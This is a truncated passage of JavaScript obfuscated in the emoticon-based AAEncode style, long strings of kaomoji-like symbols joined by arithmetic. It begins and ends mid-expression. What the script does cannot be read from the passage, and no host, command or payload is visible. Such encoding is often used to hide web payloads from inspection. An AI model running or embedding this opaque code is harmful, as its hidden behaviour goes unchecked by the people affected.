(ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟΘﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(c^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((ﾟｰﾟ) + (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (o^_^o))+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+((o^_^o) - (ﾟΘﾟ))+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + (o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+(o^_^o)+(ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+(ﾟｰﾟ)+(ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+((o^_^o) +(o^_^o))+(ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+(o^_^o)+((ﾟｰﾟ) + 